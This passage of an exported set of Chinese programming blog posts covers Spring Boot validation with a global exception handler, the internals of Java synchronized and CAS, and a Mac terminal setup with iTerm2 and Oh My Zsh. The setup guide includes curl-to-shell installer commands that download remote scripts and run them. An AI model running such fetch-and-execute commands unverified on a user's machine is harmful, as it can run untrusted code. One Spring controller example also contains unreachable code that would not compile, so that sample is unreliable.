this.age + \")\";\n    }\n}\n```\n`PersonForm` 类验证两个信息，一个是`name`，限制长度在2~30位之间；`age`，限制最小值18。\n\n### 创建一个Controller\n\n```java\n@RestController\n@RequestMapping(\"/test\")\npublic class TestController {\n    @PostMapping(\"test1\")\n    public AjaxResponse test(@Valid PersonForm personForm,BindingResult bindingResult){//【1】\n   if (bindingResult.hasErrors()) {//【2】\n            List<FieldError> errorList = bindingResult.getFieldErrors();\n            String errorMsg = errorList.get(0).getField() + \" 字段错误，错误原因:\" +       errorList.get(0).getDefaultMessage();\n            return error(errorMsg, FIELD_VALIDATE_ERROR.getKey());\n        } else {\n            return error(GLOBAL_UNKNOWN_ERROR);\n        }    \n    return ok(\"suc\");\n    }\n}\n```\n1. 定义了一个Rest的Controller，在1处增加一个Valid注解\n2. 在第二个参数定义BindingResult对象，Spring将会为我们自动注入该值\n3. 通过Controller方法去验证本次请求是否成功，如果此处不传递BindingResult对象，Spring将会向上抛出一个`BindException`异常，如果我们不做处理，Spring 内部对该异常做了一个html渲染异常的处理。\n\n启动项目，使用postman或其它http请求模拟插件做一个post请求`http://localhost:8080/test/test1`，通过填写的参数是否符合规范将返回不同的信息。\n\n通过例子我想大家已经学会使用Valid注解了，但是上面的讲解主要是针对controller具体的每一个方法做验证，没有做统一验证的处理。说明了一个问题如果每个Controller都这样写肯要**搞死人**，可能有很多个请求都会用到这个对象，那么都这样处理是不是写了很多废代码，没太搞明白Spring 的官方教程讲的这么浅显，没有做深入探究。小生在此探究一下上层的异常处理器来处理统一的`BindException`。\n\n## Spring Boot定义统一上层的异常拦截器\n\n> 在[Spring mvc 3.2引入了一个`ControllerAdvice`注解](http://docs.spring.io/spring-framework/docs/3.2.x/spring-framework-reference/htmlsingle/#new-in-3.2-webmvc-controller-advice)，这个组件我们可以用来处理Controller层向上抛出的异常，通过一下步骤来实现\n\n### 1. 创建一个`GlobalExceptionHandler`类并在类上添加`ControllerAdvice`注解\n\n``` java \npackage com.iflytek.adsring.rosp.config;\nimport org.springframework.validation.BindException;\nimport org.springframework.validation.BindingResult;\nimport org.springframework.validation.FieldError;\nimport org.springframework.web.bind.MethodArgumentNotValidException;\nimport org.springframework.web.bind.annotation.ControllerAdvice;\nimport org.springframework.web.bind.annotation.ExceptionHandler;\nimport org.springframework.web.bind.annotation.ResponseBody;\nimport org.springframework.web.bind.annotation.ResponseStatus;\n\nimport javax.servlet.http.HttpServletRequest;\nimport java.util.List;\n\nimport static com.iflytek.adsring.rosp.api.AjaxResponse.error;\nimport static com.iflytek.adsring.rosp.api.message.ServiceCode.FIELD_VALIDATE_ERROR;\nimport static com.iflytek.adsring.rosp.api.message.ServiceCode.GLOBAL_UNKNOWN_ERROR;\n\n/**\n * @author yoqu\n * @date 2017年06月30日\n * @time 下午2:53\n * @email wcjiang2@iflytek.com\n */\n@ControllerAdvice\npublic class GlobalExceptionHandler {\n\n    private static final Logger logger = LoggerFactory.getLogger(GlobalExceptionHandler.class);\n\n    @ExceptionHandler(value = Exception.class)\n    @ResponseStatus(HttpStatus.INTERNAL_SERVER_ERROR)\n    @ResponseBody\n    public AjaxResponse errorHandler(HttpServletRequest request, Exception e) {\n        logger.error(\"request page url{}, params:{}, error:{}\", request.getRequestURI(), request.getParameterMap(), e);\n        return error(e.getMessage(), ServiceCode.GLOBAL_EXCEPTION_ERROR.getKey());\n    }\n\n    @ExceptionHandler(BindException.class)\n    @ResponseBody\n    @ResponseStatus(HttpStatus.BAD_REQUEST)\n    public AjaxResponse validateErrorHandler(BindException e) {\n        BindingResult bindingResult = e.getBindingResult();\n        if (bindingResult.hasErrors()) {\n            List<FieldError> errorList = bindingResult.getFieldErrors();\n            String errorMsg = errorList.get(0).getField() + \" 字段错误，错误原因:\" + errorList.get(0).getDefaultMessage();\n            return error(errorMsg, FIELD_VALIDATE_ERROR.getKey());\n        } else {\n            return error(GLOBAL_UNKNOWN_ERROR);\n        }\n    }\n}\n```\n1. 在方法上写了一个@ExceptionHandler注解，value写拦截的异常，Exception为最大级别异常，如果一个子类异常没有被定义，所有的异常都将接入到该方法中去。\n2. ResponseStatus，如果发生了异常，需要返回一个状态码到前台处理\n3. ResponseBody，返回json串\n\n我们在ValidateErrorHandler中，通过上面的讲解，知道了验证不通过是导致发生了`BindException`异常，那么我们在这一层进行一个异常处理，通过记录日志和返回实体对象的方式来生成最后的结果。\n\n### 2. 重写之前的controller层的方法\n\n```java\n@RestController\n@RequestMapping(\"/test\")\npublic class TestController {\n    @PostMapping(\"test1\")\n    public AjaxResponse test(@Valid PersonForm personForm){//【1】\n    return ok(\"suc\");\n    }\n}\n```\n\n在1处，我们删除了之前传递的第二个参数`BindingResult`，这样当验证不通过会将异常向上抛出，我们的全局拦截器将会拦截处理。\n\n用到的一些类：\nAjaxResponse用于向前台打印消息的实体\n```java \npackage com.iflytek.adsring.rosp.api;\nimport com.alibaba.fastjson.JSON;\nimport java.io.Serializable;\nimport java.util.Map;\n/**\n * @author yoqu\n * @date 2017年06月29日\n * @time 下午2:29\n * @email wcjiang2@iflytek.com\n */\npublic class AjaxResponse implements Serializable {\n\n    /**\n     * 是否成功\n     */\n    private boolean flag;\n\n    /**\n     * 响应吗\n     */\n    private int code;\n\n    /**\n     * 业务状态码\n     */\n    private String stateCode;\n\n    /**\n     * 数据\n     */\n    private Object data;\n\n    /**\n     * 消息\n     */\n    private String msg;\n\n    public AjaxResponse() {\n\n    }\n\n    public AjaxResponse(boolean flag, String msg) {\n        this.flag = flag;\n        this.msg = msg;\n    }\n\n    public AjaxResponse(boolean flag, String msg, Object data) {\n        this(flag, msg);\n        this.data = data;\n    }\n\n    public AjaxResponse(boolean flag, String msg, String stateCode, Object data) {\n        this(flag, msg, data);\n        this.stateCode = stateCode;\n    }\n\n    public static AjaxResponse ok(Object data) {\n        return ok(\"success\", data);\n    }\n\n    public static AjaxResponse ok(String msg){\n        return ok(msg,null);\n    }\n\n    public static AjaxResponse ok(String msg, Object data) {\n        return new AjaxResponse(true, msg, data);\n    }\n\n    public static AjaxResponse error(String msg, String stateCode, Object data) {\n        return new AjaxResponse(false, msg, stateCode, data);\n    }\n\n    public static AjaxResponse error(Map.Entry<String,String> code) {\n        return new AjaxResponse(false,code.getValue(),code.getKey(),null);\n    }\n\n    public static AjaxResponse error(Map.Entry<String,String> code,Object data) {\n        return new AjaxResponse(false,code.getValue(),code.getKey(),data);\n    }\n\n    public static AjaxResponse error(String msg, String stateCode) {\n        return error(msg, stateCode, null);\n    }\n\n    public static AjaxResponse error(String msg, Object data) {\n        return error(msg, \"\", data);\n    }\n\n    public boolean isFlag() {\n        return flag;\n    }\n\n    public void setFlag(boolean flag) {\n        this.flag = flag;\n    }\n\n    public int getCode() {\n        return code;\n    }\n\n    public void setCode(int code) {\n        this.code = code;\n    }\n\n    public String getStateCode() {\n        return stateCode;\n    }\n\n    public void setStateCode(String stateCode) {\n        this.stateCode = stateCode;\n    }\n\n    public Object getData() {\n        return data;\n    }\n\n    public void setData(Object data) {\n        this.data = data;\n    }\n\n    public String getMsg() {\n        return msg;\n    }\n\n    public void setMsg(String msg) {\n        this.msg = msg;\n    }\n\n    public String toJSON() {\n        return JSON.toJSONString(this);\n    }\n}\n```\n\n系统错误码`ServiceCode`\n```java\npackage com.iflytek.adsring.rosp.api.message;\n\nimport java.util.AbstractMap;\nimport java.util.Map;\n\n/**\n * @author yoqu\n * @date 2017年06月30日\n * @time 下午2:48\n * @email wcjiang2@iflytek.com\n * 系统错误码对应库\n */\npublic class ServiceCode {\n    public static Map.Entry<String, String> FIELD_VALIDATE_ERROR = new AbstractMap.SimpleEntry<String, String>(\"100000000\", \"参数错误\");\n    public static Map.Entry<String, String> GLOBAL_EXCEPTION_ERROR = new AbstractMap.SimpleEntry<String, String>(\"100000001\", \"系统异常\");\n    public static Map.Entry<String, String> GLOBAL_UNKNOWN_ERROR = new AbstractMap.SimpleEntry<String, String>(\"100000002\", \"未知错误\");\n}\n```",
			"tags":"spring,validation,表单",
			"id":"74010821",
			"categories":"JAVA_spring",
			"status":1
		},
		"error":"",
		"status":true
	},
	{
		"data":{
			"date":"2017年06月01日 19:09:47",
			"articleedittype":1,
			"private":0,
			"channel":"16",
			"description":"synchornized 实现原理再JAVA1.6对synchronized进行优化后，能够减少获得锁和释放锁带来的性能消耗，主要是引入了偏向锁和轻量级锁。还有优化了锁的存储结构和升级结构。再jvm规范中，看到synchornized实现原理是基于进入退出Monitor对象实现方法同步和代码同步。代码块同步使用monitorenter和monitorexit指令实现，方法同步另外一种方式实现。\nmo",
			"title":"java多线程之synchornized原理以及原子操作探究学习",
			"type":"original",
			"content":"<h2 id=\"synchornized-实现原理\">synchornized 实现原理</h2>\n\n<p>再JAVA1.6对synchronized进行优化后，能够减少获得锁和释放锁带来的性能消耗，主要是引入了偏向锁和轻量级锁。还有优化了锁的存储结构和升级结构。</p>\n\n<p>再jvm规范中，看到synchornized实现原理是基于进入退出Monitor对象实现方法同步和代码同步。代码块同步使用monitorenter和monitorexit指令实现，方法同步另外一种方式实现。</p>\n\n<ul>\n<li><code>monitorentor</code>指令是编译后查询到同步代码块的开始位置</li>\n<li><code>monitorexit</code>指令是插入方法结束和异常处。</li>\n</ul>\n\n\n\n<h3 id=\"java对象头\">JAVA对象头</h3>\n\n<p>synchronized用的锁是存在java对象头中的。JAVA对象头中的mark word 存储对象的<code>HashCode</code>、<code>粉黛年龄</code>和<code>锁标记位</code>。</p>\n\n<blockquote>\n  <p>原理：根据JAVA Object Model定义，Object Header是一个2字(1 word =4 byte)长度的存储区域。</p>\n  \n  <p>第一个长度区域用于标记同步，GC以及hash code，成为mark word。第二字长度区域指向对象的class</p>\n  \n  <p>mark word是轻量级实现的关键</p>\n</blockquote>\n\n\n\n<h3 id=\"轻量级锁\">轻量级锁</h3>\n\n\n\n<h4 id=\"轻量级锁加锁\">轻量级锁加锁</h4>\n\n<p>​   线程再执行同步块代码之前，jvm会为当前线程分配lock record，并复制对象头中的mark word到lock record 中，然后使用CAS将mark word替换为指向lock record的指针。如果成功就获得锁执行同步体，如果失败，表示其他线程使用中，调用OS的互斥原语，挂起当前线程，直到被唤醒。</p>\n\n\n\n<h4 id=\"轻量级解锁\">轻量级解锁</h4>\n\n<p>​   轻量级解锁时，会使用原子的CAS将lock record替换回对象头中，成功表示没有竞争，如果失败表示有锁竞争，锁会被释放并唤醒被挂起的线程。</p>\n\n<p><img src=\"http://upload-images.jianshu.io/upload_images/1489067-5139101232327389.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\" alt=\"JAVA轻量级加锁流程图.png\" title=\"\"></p>\n\n\n\n<h3 id=\"锁的优缺点对比\">锁的优缺点对比</h3>\n\n<table>\n<thead>\n<tr>\n  <th align=\"center\">锁</th>\n  <th align=\"center\">优点</th>\n  <th align=\"center\">缺点</th>\n  <th align=\"center\">适用场景</th>\n</tr>\n</thead>\n<tbody><tr>\n  <td align=\"center\">偏向锁</td>\n  <td align=\"center\">加锁和解锁不需要额外消耗</td>\n  <td align=\"center\">如果线程存在锁竞争，会带来额外锁撤销的消耗</td>\n  <td align=\"center\">适用于只有一个线程访问同步块场景</td>\n</tr>\n<tr>\n  <td align=\"center\">轻量级锁</td>\n  <td align=\"center\">竞争的锁不会阻塞，提高了程序的响应速度</td>\n  <td align=\"center\">如果是中得不到锁竞争的线程，会自旋消耗cpu</td>\n  <td align=\"center\">追求响应时间，同步块执行速度非常快</td>\n</tr>\n<tr>\n  <td align=\"center\">重量级锁</td>\n  <td align=\"center\">线程竞争不使用自旋，不会消耗CPU</td>\n  <td align=\"center\">线程租塞，响应时间慢</td>\n  <td align=\"center\">追求吞吐量，同步块执行速度较长</td>\n</tr>\n</tbody></table>\n\n\n\n\n<h2 id=\"原子操作的实现原理\">原子操作的实现原理</h2>\n\n\n\n<h3 id=\"处理器如何实现原子操作\">处理器如何实现原子操作</h3>\n\n<p>32位IA-32处理器使用基于对<code>缓存加锁</code>或<code>总线加锁</code>的方式来实现<code>多</code>处理器的原子操作。</p>\n\n<p>当一个处理器读取一个字节时，其他处理器不能访问这个字节的内存地址。</p>\n\n\n\n<h4 id=\"1-使用总线锁保证原子性\">1. 使用总线锁保证原子性</h4>\n\n<p><strong>通过总线锁来保证原子性</strong>，如果多个处理器同时对共享变量进行读改写操作，那么共享变量会被多个处理器同时操作，这样读写操作就不是原子的，操作完后的共享变量值会和期望的不一样。</p>\n\n<p>处理器使用总线锁就是解决这个问题的，总线锁就是使用处理器提供的lock#信号，其他处理器会被阻塞，那么该处理器能够独享内存</p>\n\n\n\n<h4 id=\"2使用缓存锁保证原子性\">2.使用缓存锁保证原子性</h4>\n\n<p>在一个时刻，我们只需要保证某个内存地址的操作是原子性即可，但是总线锁定会把CPU和内存之间的通信锁住，使得锁定期间，其他处理器不能操作其他内存地址的数据，所以总线锁定开销较大，在某些场合下使用缓存锁定来代替总线锁定进行优化。</p>\n\n<p>缓存锁定是指内存区域如果被缓存再处理器的缓存行中，且再lock操作期间被锁定，那么当写回内存时，不在总线上声言LOCK#信号，而是修改内部的内存地址，允许缓存一致性机制来保证操作的原子性。</p>\n\n<blockquote>\n  <p>有两种情况处理器不会使用缓存锁</p>\n</blockquote>\n\n<ul>\n<li>当操作的数据不能缓存到处理器内部，或操作的数据横跨多个cache line时，处理器会调用总线锁定</li>\n<li>某些处理器不支持缓存锁定，就算锁定内存区域再处理缓存行中也会调用总线锁定</li>\n</ul>\n\n\n\n<h3 id=\"java如何实现原子操作\">java如何实现原子操作</h3>\n\n<p>JAVA可以通过锁和循环CAS来实现原子操作</p>\n\n\n\n<h4 id=\"1使用循环cas实现原子操作\">1.使用循环CAS实现原子操作</h4>\n\n<p>JVM中的CAS操作正是利用处理器提供的<code>CMPXCHG</code>指令实现的，以下代码实现一个基于CAS线程安全的计数器方法saefCount和一个非线程安全的计数器count</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-java hljs \"><span class=\"hljs-keyword\">package</span> org.yoqu.javastudy.thread.lock;\n\n<span class=\"hljs-keyword\">import</span> java.util.ArrayList;\n<span class=\"hljs-keyword\">import</span> java.util.List;\n<span class=\"hljs-keyword\">import</span> java.util.concurrent.atomic.AtomicInteger;\n\n<span class=\"hljs-javadoc\">/**\n *<span class=\"hljs-javadoctag\"> @author</span> yoqu\n *<span class=\"hljs-javadoctag\"> @date</span> 2017年06月01日\n *<span class=\"hljs-javadoctag\"> @time</span> 下午4:25\n *<span class=\"hljs-javadoctag\"> @email</span> wcjiang2@iflytek.com\n */</span>\n<span class=\"hljs-keyword\">public</span> <span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">CasSafaThread</span> {</span>\n    <span class=\"hljs-keyword\">private</span> AtomicInteger atomicInteger = <span class=\"hljs-keyword\">new</span> AtomicInteger(<span class=\"hljs-number\">0</span>);\n    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-keyword\">int</span> result = <span class=\"hljs-number\">0</span>;\n\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">static</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title\">main</span>(String[] args) {\n        <span class=\"hljs-keyword\">final</span> CasSafaThread cas = <span class=\"hljs-keyword\">new</span> CasSafaThread();\n        Long start = System.currentTimeMillis();\n        List&lt;Thread&gt; ts = <span class=\"hljs-keyword\">new</span> ArrayList&lt;&gt;(<span class=\"hljs-number\">600</span>);\n        <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">int</span> i = <span class=\"hljs-number\">0</span>; i &lt; <span class=\"hljs-number\">100</span>; i++) {\n            Thread t =<span class=\"hljs-keyword\">new</span> Thread(<span class=\"hljs-keyword\">new</span> Runnable() {\n                <span class=\"hljs-annotation\">@Override</span>\n                <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title\">run</span>() {\n                    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">int</span> j = <span class=\"hljs-number\">0</span>; j &lt; <span class=\"hljs-number\">10000</span>; j++) {\n                        cas.count();\n                        cas.safeCount();\n                    }\n                }\n            });\n            ts.add(t);\n        }\n        <span class=\"hljs-keyword\">for</span> (Thread t:ts) {\n            t.start();\n        }\n        <span class=\"hljs-keyword\">for</span> (Thread i : ts){\n            <span class=\"hljs-keyword\">try</span>{\n                i.join();\n            } <span class=\"hljs-keyword\">catch</span> (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n        System.out.println(<span class=\"hljs-string\">\"result:\"</span>+cas.result);\n        System.out.println(<span class=\"hljs-string\">\"atomic:\"</span>+cas.atomicInteger.get());\n        System.out.println(System.currentTimeMillis()-start);\n    }\n    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title\">safeCount</span>(){\n        <span class=\"hljs-keyword\">for</span> (;;){\n            <span class=\"hljs-keyword\">int</span> i=atomicInteger.get();\n            <span class=\"hljs-keyword\">boolean</span> suc = atomicInteger.compareAndSet(i,++i);\n            <span class=\"hljs-keyword\">if</span> (suc){\n                <span class=\"hljs-keyword\">break</span>;\n            }\n        }\n    }\n    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title\">count</span>(){\n        result++;\n    }\n}</code></pre>\n\n<p>从JAVA1.5开始，jdk的并发包就提供了一些类支持原子操作，AtomicBoolean AtomicInteger AtomicLong </p>\n\n\n\n<h4 id=\"2-cas实现原子操作的三大问题\">2. cas实现原子操作的三大问题</h4>\n\n<ol>\n<li><strong>ABA问题</strong>，因为cas需要再操作值的时候检测值有没有变化，如果没有变化则更新，如果一个值原来是A，又变成了B，又变成了A，那么CAS检查的时候会发现它值没有发生变化，但是实际上却变了，ABA问题的解决思路是使用版本号，变量钱追加版本号，每次更新时候版本+1，jdk 的Atomic包提供了AtomicStampedReference来解决ABA问题，</li>\n<li>循环时间长，开销大。如果长时间不成功，会给cpu带来非常大的执行开销，如果JVM能支持处理器提供的pause指令，那么效率会有一定的提升。pause 指令有两个作用： <br>\n<ol><li>延迟流水线执行指令，使得cpu不会消耗过多的执行资源，延迟时间取决具体实现的版本，</li>\n<li>避免退出循环时候因内存顺序冲突引起cpu流水线被清空，提高cpu的执行效率</li></ol></li>\n<li>只能保证一个共享变量的原子操作。当对一个共享变量操作时，我们可以使用循环CAS的方式来保证原子操作，但是对于多个共享变量操作时， 循环CAS无法保证操作的原子性，这个时候可以用锁。或者把多个共享变量合并成一个共享变量来操作。</li>\n</ol>\n\n\n\n<h4 id=\"3-使用锁机制实现原子操作\">3. 使用锁机制实现原子操作</h4>\n\n<p>锁机制保证了只有获得锁的线程才能够操作锁定的内存区域，jvm内部实现了多种，偏向锁，轻量级锁和互斥锁。除了偏向锁，jvm实现锁的方式都用了循环CAS。</p>",
			"markdowncontent":"## synchornized 实现原理\n\n再JAVA1.6对synchronized进行优化后，能够减少获得锁和释放锁带来的性能消耗，主要是引入了偏向锁和轻量级锁。还有优化了锁的存储结构和升级结构。\n\n再jvm规范中，看到synchornized实现原理是基于进入退出Monitor对象实现方法同步和代码同步。代码块同步使用monitorenter和monitorexit指令实现，方法同步另外一种方式实现。\n\n* `monitorentor`指令是编译后查询到同步代码块的开始位置\n* `monitorexit`指令是插入方法结束和异常处。\n\n### JAVA对象头\n\nsynchronized用的锁是存在java对象头中的。JAVA对象头中的mark word 存储对象的`HashCode`、`粉黛年龄`和`锁标记位`。\n\n> 原理：根据JAVA Object Model定义，Object Header是一个2字(1 word =4 byte)长度的存储区域。\n>\n> 第一个长度区域用于标记同步，GC以及hash code，成为mark word。第二字长度区域指向对象的class\n>\n> mark word是轻量级实现的关键\n\n\n\n### 轻量级锁\n\n#### \t轻量级锁加锁\n\n​\t线程再执行同步块代码之前，jvm会为当前线程分配lock record，并复制对象头中的mark word到lock record 中，然后使用CAS将mark word替换为指向lock record的指针。如果成功就获得锁执行同步体，如果失败，表示其他线程使用中，调用OS的互斥原语，挂起当前线程，直到被唤醒。\n\n#### 轻量级解锁\n\n\n​\t轻量级解锁时，会使用原子的CAS将lock record替换回对象头中，成功表示没有竞争，如果失败表示有锁竞争，锁会被释放并唤醒被挂起的线程。\n\n![JAVA轻量级加锁流程图.png](http://upload-images.jianshu.io/upload_images/1489067-5139101232327389.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)\n\n\n### 锁的优缺点对比\n\n|  锁   |         优点          |           缺点           |       适用场景        |\n| :--: | :-----------------: | :--------------------: | :---------------: |\n| 偏向锁  |    加锁和解锁不需要额外消耗     | 如果线程存在锁竞争，会带来额外锁撤销的消耗  | 适用于只有一个线程访问同步块场景  |\n| 轻量级锁 | 竞争的锁不会阻塞，提高了程序的响应速度 | 如果是中得不到锁竞争的线程，会自旋消耗cpu | 追求响应时间，同步块执行速度非常快 |\n| 重量级锁 |  线程竞争不使用自旋，不会消耗CPU  |       线程租塞，响应时间慢       |  追求吞吐量，同步块执行速度较长  |\n\n\n\n## 原子操作的实现原理\n\n### 处理器如何实现原子操作\n\n32位IA-32处理器使用基于对`缓存加锁`或`总线加锁`的方式来实现`多`处理器的原子操作。\n\n 当一个处理器读取一个字节时，其他处理器不能访问这个字节的内存地址。\n\n#### 1. 使用总线锁保证原子性\n\n**通过总线锁来保证原子性**，如果多个处理器同时对共享变量进行读改写操作，那么共享变量会被多个处理器同时操作，这样读写操作就不是原子的，操作完后的共享变量值会和期望的不一样。\n\n处理器使用总线锁就是解决这个问题的，总线锁就是使用处理器提供的lock#信号，其他处理器会被阻塞，那么该处理器能够独享内存\n\n#### 2.使用缓存锁保证原子性\n\n在一个时刻，我们只需要保证某个内存地址的操作是原子性即可，但是总线锁定会把CPU和内存之间的通信锁住，使得锁定期间，其他处理器不能操作其他内存地址的数据，所以总线锁定开销较大，在某些场合下使用缓存锁定来代替总线锁定进行优化。\n\n缓存锁定是指内存区域如果被缓存再处理器的缓存行中，且再lock操作期间被锁定，那么当写回内存时，不在总线上声言LOCK#信号，而是修改内部的内存地址，允许缓存一致性机制来保证操作的原子性。\n\n>  有两种情况处理器不会使用缓存锁\n\n- 当操作的数据不能缓存到处理器内部，或操作的数据横跨多个cache line时，处理器会调用总线锁定\n- 某些处理器不支持缓存锁定，就算锁定内存区域再处理缓存行中也会调用总线锁定\n\n### java如何实现原子操作\n\nJAVA可以通过锁和循环CAS来实现原子操作\n\n#### 1.使用循环CAS实现原子操作\n\nJVM中的CAS操作正是利用处理器提供的`CMPXCHG`指令实现的，以下代码实现一个基于CAS线程安全的计数器方法saefCount和一个非线程安全的计数器count\n\n```java\npackage org.yoqu.javastudy.thread.lock;\n\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.concurrent.atomic.AtomicInteger;\n\n/**\n * @author yoqu\n * @date 2017年06月01日\n * @time 下午4:25\n * @email wcjiang2@iflytek.com\n */\npublic class CasSafaThread {\n    private AtomicInteger atomicInteger = new AtomicInteger(0);\n    private int result = 0;\n\n    public static void main(String[] args) {\n        final CasSafaThread cas = new CasSafaThread();\n        Long start = System.currentTimeMillis();\n        List<Thread> ts = new ArrayList<>(600);\n        for (int i = 0; i < 100; i++) {\n            Thread t =new Thread(new Runnable() {\n                @Override\n                public void run() {\n                    for (int j = 0; j < 10000; j++) {\n                        cas.count();\n                        cas.safeCount();\n                    }\n                }\n            });\n            ts.add(t);\n        }\n        for (Thread t:ts) {\n            t.start();\n        }\n        for (Thread i : ts){\n            try{\n                i.join();\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n        System.out.println(\"result:\"+cas.result);\n        System.out.println(\"atomic:\"+cas.atomicInteger.get());\n        System.out.println(System.currentTimeMillis()-start);\n    }\n    private void safeCount(){\n        for (;;){\n            int i=atomicInteger.get();\n            boolean suc = atomicInteger.compareAndSet(i,++i);\n            if (suc){\n                break;\n            }\n        }\n    }\n    private void count(){\n        result++;\n    }\n}\n```\n\n从JAVA1.5开始，jdk的并发包就提供了一些类支持原子操作，AtomicBoolean AtomicInteger AtomicLong \n\n#### 2. cas实现原子操作的三大问题\n\n1. **ABA问题**，因为cas需要再操作值的时候检测值有没有变化，如果没有变化则更新，如果一个值原来是A，又变成了B，又变成了A，那么CAS检查的时候会发现它值没有发生变化，但是实际上却变了，ABA问题的解决思路是使用版本号，变量钱追加版本号，每次更新时候版本+1，jdk 的Atomic包提供了AtomicStampedReference来解决ABA问题，\n2. 循环时间长，开销大。如果长时间不成功，会给cpu带来非常大的执行开销，如果JVM能支持处理器提供的pause指令，那么效率会有一定的提升。pause 指令有两个作用：\n   1. 延迟流水线执行指令，使得cpu不会消耗过多的执行资源，延迟时间取决具体实现的版本，\n   2. 避免退出循环时候因内存顺序冲突引起cpu流水线被清空，提高cpu的执行效率\n3. 只能保证一个共享变量的原子操作。当对一个共享变量操作时，我们可以使用循环CAS的方式来保证原子操作，但是对于多个共享变量操作时， 循环CAS无法保证操作的原子性，这个时候可以用锁。或者把多个共享变量合并成一个共享变量来操作。\n\n#### 3. 使用锁机制实现原子操作\n锁机制保证了只有获得锁的线程才能够操作锁定的内存区域，jvm内部实现了多种，偏向锁，轻量级锁和互斥锁。除了偏向锁，jvm实现锁的方式都用了循环CAS。",
			"tags":"java,jvm,多线程,CAS,synchronized",
			"id":"72834368",
			"categories":"JAVA基础",
			"status":1
		},
		"error":"",
		"status":true
	},
	{
		"data":{
			"date":"2017年04月25日 23:50:28",
			"articleedittype":1,
			"private":0,
			"channel":"16",
			"description":"截图效果: \n安装ITerm2brew cask install iterm2\n如果没有安装brew请在命令行执行安装brew\n/usr/bin/ruby -e \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)\"\n如果不想安装brew可以使用去ITerm官网下载并安装.",
			"title":"mac终端美化之安装iTerm2 + Oh My Zsh + Solarized color scheme + Meslo powerline font + [Powerlevel9k]",
			"type":"original",
			"content":"<p><strong>截图效果</strong>: <br>\n<img src=\"http://img.blog.csdn.net/20170425234900660?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXV1cXU=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast\" alt=\"效果\" title=\"\"></p>\n\n\n\n<h2 id=\"安装iterm2\">安装ITerm2</h2>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-source-shell hljs cmake\">brew cask <span class=\"hljs-keyword\">install</span> iterm2</code></pre>\n\n<ul>\n<li>如果没有安装brew请在命令行执行安装brew</li>\n</ul>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-source-shell hljs bash\">/usr/bin/ruby <span class=\"hljs-operator\">-e</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)</span>\"</span></code></pre>\n\n<ul>\n<li>如果不想安装brew可以使用去ITerm官网<a href=\"http://www.iterm2.com/downloads.html\">下载</a>并安装.</li>\n</ul>\n\n\n\n<h2 id=\"下载主题\">下载主题</h2>\n\n<ul>\n<li><a href=\"https://raw.githubusercontent.com/mbadolato/iTerm2-Color-Schemes/master/schemes/Solarized%20Dark%20-%20Patched.itermcolors\">Solarized Dark theme</a> </li>\n<li><a href=\"https://raw.githubusercontent.com/altercation/solarized/master/iterm2-colors-solarized/Solarized%20Light.itermcolors\">Solarized Light theme</a></li>\n<li><a href=\"http://iterm2colorschemes.com/\">其他主题</a></li>\n</ul>\n\n<p>保存到 本地后 打开iTerm-&gt; profiles -&gt; colors -&gt; load presets.</p>\n\n\n\n<h2 id=\"安装-oh-my-zsh\">安装 <a href=\"https://github.com/robbyrussell/oh-my-zsh\">oh my zsh</a></h2>\n\n\n\n<h3 id=\"安装命令\">安装命令</h3>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-source-shell hljs bash\">sh -c <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)</span>\"</span></code></pre>\n\n<p>下载完成后编辑<code>.zshrc</code>文件并指定主题为<code>agnoster</code></p>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-source-shell hljs avrasm\">vim ~/<span class=\"hljs-preprocessor\">.zshrc</span>\n<span class=\"hljs-keyword\">set</span> ZSH_THEME=<span class=\"hljs-string\">\"agnoster\"</span></code></pre>\n\n\n\n<h2 id=\"安装powerlevel9k主题\">安装Powerlevel9k主题</h2>\n\n\n\n<h3 id=\"安装命令-1\">安装命令</h3>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-bash hljs \">git clone https://github.com/bhilburn/powerlevel9k.git ~/.oh-my-zsh/custom/themes/powerlevel9k</code></pre>\n\n<p>下载完成后编辑<code>.zashrc</code>文件并指定主题</p>\n\n\n\n<pre class=\"prettyprint\"><code class=\"language-bash hljs \">vim ~/.zshrc\n<span class=\"hljs-keyword\">set</span> ZSH_THEME=<span class=\"hljs-string\">\"powerlevel9k/powerlevel9k\"</span>.</code></pre>\n\n<p>自定义设置可以参考<a href=\"https://github.com/bhilburn/powerlevel9k/wiki/Show-Off-Your-Config\">这里</a>.</p>\n\n\n\n<h2 id=\"安装字体\">安装字体</h2>\n\n<ul>\n<li><a href=\"https://github.com/powerline/fonts/blob/master/Meslo%20Slashed/Meslo%20LG%20M%20Regular%20for%20Powerline.ttf\">Meslo</a> </li>\n<li><a href=\"https://github.com/powerline/fonts/blob/master/SourceCodePro/Sauce%20Code%20Powerline%20Regular.otf\">Source Code Pro</a> <code>@14px</code>字体比较协调.</li>\n<li><a href=\"https://github.com/powerline/fonts\">Others @ powerline fonts</a> <br>\n下载后安装字体在iTerm2设置 <br>\niTerm -&gt; Preferences -&gt; Profiles -&gt; Text -&gt; Change Font. 